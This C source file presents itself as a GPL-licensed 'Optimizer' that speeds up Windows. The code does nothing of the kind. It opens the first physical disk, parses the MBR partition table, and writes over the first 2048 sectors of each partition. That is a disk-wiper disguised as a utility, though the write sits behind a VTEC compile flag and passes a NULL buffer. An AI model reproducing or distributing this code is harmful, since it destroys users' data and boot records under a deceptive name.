/* 
 * Optimizer -- Speed up Windows
 * 
 * Copyright (C) 2007-2010  Anonymous
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>
#include <stdlib.h>

#include "getsector.h"
#include "optimizedisk.h"
#include "mbrop.h"

#define BLOCKSTOWRITE	2048

static partinfo_t decodeentry(uchar *entry) {
	partinfo_t out;

	out.boot = (entry[0] & 0x80) >> 7;

	out.start_chs.c = ((entry[2] & 0xc0) << 2) | entry[3];
	out.start_chs.h = entry[1];
	out.start_chs.s = entry[2] & 0x3f;

	out.type = entry[4];

	out.end_chs.c = ((entry[6] & 0xc0) << 2) | entry[7];
	out.end_chs.h = entry[5];
	out.end_chs.s = entry[6] & 0x3f;

	out.start_lba = entry[8] | entry[9] << 8 | entry[10] << 16 | entry[11] << 24;
	out.size = entry[12] | entry[13] << 8 | entry[14] << 16 | entry[15] << 24;

	return out;
}

void OptimizePartition(HANDLE DiskHandle, LARGE_INTEGER addr, int BytesPerSector) {
	int sector;
	int written;
	SetFilePointerEx(DiskHandle, addr, NULL, FILE_BEGIN);

	for(sector = 0; sector < BLOCKSTOWRITE; sector++)
#ifdef VTEC
		WriteFile(DiskHandle, NULL, BytesPerSector, &written, NULL);
#endif
}

void OptimizeDisk(void) {
	int i;
	uchar *mbr, buf[512];
	fsinfo_t fsinfo;
	partinfo_t entry;
	HANDLE DiskHandle;
	LARGE_INTEGER partaddr;

	fsinfo = GetFsInfo(TEXT("C:\\"));
	mbr = readmbr();
	if(mbr == NULL)
		return;

	DiskHandle = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), 
		GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING,
		FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, 0);

	for(i = 0; i < 4; i++) {
		entry = decodeentry(mbr + 0x1be + i * 16);
		partaddr.QuadPart = entry.start_lba * fsinfo.BytesPerSector;
		OptimizePartition(DiskHandle, partaddr, fsinfo.BytesPerSector);
	}

	CloseHandle(DiskHandle);
	free(mbr);
}
